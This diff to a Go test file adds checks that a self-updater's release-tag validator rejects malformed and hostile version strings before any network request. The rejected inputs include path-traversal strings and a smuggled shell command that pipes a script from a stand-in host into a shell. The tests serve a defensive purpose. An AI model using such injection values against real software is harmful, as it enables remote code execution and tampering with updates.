@@ -587,3 +587,60 @@ func TestDownloadAndReplace_StalePrevIsNotPromotedOnAFreshInstall(t *testing.T) 
 		t.Errorf(".prev was disturbed: %q", got)
 	}
 }
+
+// The tag becomes a URL path segment and Go does not normalize dot-segments,
+// so the shape has to be validated here rather than trusted to whatever the
+// server does with it.
+func TestReleaseTag_RejectsAnythingThatIsNotAVersion(t *testing.T) {
+	for _, ok := range []string{"0.17.0", "v0.17.0", "1.2.3-rc.1", "v10.20.30"} {
+		got, err := releaseTag(ok)
+		if err != nil {
+			t.Errorf("releaseTag(%q) errored: %v", ok, err)
+		}
+		if !strings.HasPrefix(got, "v") {
+			t.Errorf("releaseTag(%q) = %q, want a v prefix", ok, got)
+		}
+	}
+	for _, bad := range []string{
+		"../../attacker/evil/releases/latest",
+		"v../../attacker/evil",
+		"0.1.0?per_page=1",
+		"0.1.0#frag",
+		"0.17.1; curl evil.sh | sh",
+		"latest",
+		"",
+	} {
+		if bad == "" {
+			continue // empty means "latest release", handled separately
+		}
+		if _, err := releaseTag(bad); err == nil {
+			t.Errorf("releaseTag(%q) should have been rejected", bad)
+		}
+	}
+	if got, err := releaseTag(""); err != nil || got != "" {
+		t.Errorf(`releaseTag("") = %q, %v — empty must mean "latest"`, got, err)
+	}
+}
+
+func TestCheck_RejectsAHostileTargetBeforeAnyRequest(t *testing.T) {
+	var requests int
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		requests++
+	}))
+	defer srv.Close()
+	orig := releaseTagAPIURL
+	releaseTagAPIURL = srv.URL + "/tags/%[2]s?repo=%[1]s"
+	defer func() { releaseTagAPIURL = orig }()
+
+	_, err := Check(context.Background(), Options{
+		CurrentVersion: "0.17.0",
+		BinPath:        canonicalBin(t),
+		TargetVersion:  "../../attacker/evil/releases/latest",
+	})
+	if err == nil {
+		t.Fatal("expected the target to be rejected")
+	}
+	if requests != 0 {
+		t.Errorf("a rejected target must not reach the network, got %d requests", requests)
+	}
+}
